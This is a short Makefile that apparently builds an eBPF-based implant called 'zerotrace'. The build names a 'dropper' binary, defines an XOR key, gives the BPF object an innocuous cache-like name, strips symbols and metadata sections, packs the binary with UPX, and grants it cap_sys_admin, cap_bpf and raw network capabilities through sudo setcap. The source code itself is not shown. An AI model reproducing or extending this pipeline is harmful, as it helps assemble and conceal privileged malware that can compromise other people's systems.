CC = clang
ZIG = zig
BPF_OBJ = target/vfs_cache.bpf.o
FINAL_BIN = target/zerotrace
DROPPER = target/drop
XOR_KEY = 0x5F

all: clean bpf loader dropper finalize

bpf:
	mkdir -p target
	$(CC) -O3 -target bpf -D__TARGET_ARCH_x86 -g -c src/bpf/vfs_cache.bpf.c -o $(BPF_OBJ)

loader:
	# Compile with static musl for universal portability
	$(ZIG) build-exe src/main.zig \
		-O ReleaseSmall \
		-target x86_64-linux-musl \
		--name $(FINAL_BIN) \
		-fsingle-threaded

dropper:
	$(CC) -O2 scripts/dropper.c -o $(DROPPER) -luring

finalize:
	# 1. Strip all symbols and non-critical sections
	strip --strip-all --remove-section=.comment --remove-section=.note $(FINAL_BIN)
	# 2. UPX compression (Brute mode for smallest footprint)
	upx --ultra-brute $(FINAL_BIN)
	# 3. Apply capabilities
	sudo setcap cap_net_admin,cap_net_raw,cap_sys_admin,cap_bpf+ep $(FINAL_BIN)

clean:
	rm -rf target
